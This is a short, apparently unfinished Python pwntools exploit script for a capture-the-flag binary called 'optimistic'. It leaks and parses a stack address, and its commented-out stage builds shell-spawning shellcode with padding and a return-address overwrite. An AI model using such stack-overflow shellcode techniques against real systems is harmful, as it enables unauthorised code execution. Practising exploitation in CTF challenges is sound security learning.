
from pwn import *

#context.log_level = 'DEBUG'
context(os='linux', arch='amd64')

ret_offset = 0

log.info('Connect Remote')
#io = remote('', )
io = process('/home/kali/Downloads/optimistic')


log.info('Get Stack Address')
io.sendlineafter('(y/n): ', 'y')
stack_address = io.recvline().strip().split()[-1]
stack_address = ''.join([chr(int(stack_address[i: i+2], 16))
                         for i in range(2, len(stack_address), 2)])
stack_address = stack_address.rjust(8, '\x00')
stack_address = u64(stack_address, endian='big')
log.success(f'Leaked stack address: {p64(stack_address)}')




#log.info('Send Password')
#io.sendlineafter('> ', '2')
#io.sendlineafter('password: ', password)

#log.info('Send payload')
#shellcode = asm(
#    shellcraft.popad() +
#    shellcraft.sh()
#)
#padding = b'A' * (ret_offset - len(shellcode))
#payload = shellcode + padding + p64(stack_address)
#io.sendlineafter('commands: ', payload)

#log.info('Trigger Return')
#io.sendlineafter('> ', '3')

io.interactive()
